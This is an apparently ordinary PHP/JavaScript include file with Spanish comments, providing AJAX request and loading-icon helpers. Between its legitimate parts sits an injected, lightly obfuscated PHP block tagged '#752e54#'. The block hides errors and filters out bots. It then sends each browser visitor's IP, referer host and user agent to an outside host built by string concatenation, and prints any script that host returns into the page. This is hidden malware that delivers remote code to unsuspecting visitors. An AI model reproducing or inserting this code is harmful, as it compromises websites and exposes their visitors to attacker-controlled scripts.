<?php
	if(eregi("ajax.php", $_SERVER['PHP_SELF'])) //Nombre del file php que actualmente se procesa
	{
		header("Location: index.html");//Enviar cabeceras http
		die; //Terminar el scrip
	}
?>
<?php
#752e54#
error_reporting(0); @ini_set('display_errors',0); $wp_fsh3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_fsh3) && !preg_match ('/bot/i', $wp_fsh3))){
$wp_fsh093="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_fsh3);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_fsh093); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_3fsh = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3fsh = @file_get_contents($wp_fsh093);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3fsh=@stream_get_contents(@fopen($wp_fsh093, "r"));}}
if (substr($wp_3fsh,1,3) === 'scr'){ echo $wp_3fsh; }
#/752e54#
?>
	
<script language="javascript" type="text/javascript">
	function delIntro(e)
	{
		if(e.keyCode==13)
		{
			return;
		}
	}
	
	//Funcion que quita espacios a una cadena de texto
	function quitarEspacios(cad)
	{
		cadAux = cad.split(""); //Convierte una cadena en un array de caracteres
		newCad = "";
		for(i=0; i<cadAux.length; i++)
		{
			if(cadAux[i]!=" ")
			{
				newCad+=cadAux[i];
			}
		}
		return newCad;
	}
	
	//Funcion encargada de crear un objeto XMLHttpRequest
	function crearObjeto()
	{
		var obj;
		
		try
		{
			obj = new ActiveXObject("Msxml2.XMLHTTP");
		}
		catch(e1)
		{
			try
			{
				obj = new ActiveXObject("Microsoft.XMLHTTP");
			}
			catch(e2)
			{
				obj=false;
			}
		}
		if(!obj && typeof XMLHttpRequest!='undefined')
		{
			obj = new XMLHttpRequest();
		}
		return obj;
	}
	
	//Funcion que de acuerdo al id de una capa, agrega un icono que muestra la carga de
	// algún dato de la pagina
	function agregarCargando(idNom)
	{
		htm = "<table width=\"36\" height=\"37\" border=\"0\" align=\"center\"><tr><td width=\"45\" background=\"../imagenes/cargando2.gif\"><label></label></td></tr></table>";
		document.getElementById(idNom).innerHTML = htm;
	}
	
	function quitarCargando(idNom)
	{
		document.getElementById(idNom).innerHTML = "";
	}
</script>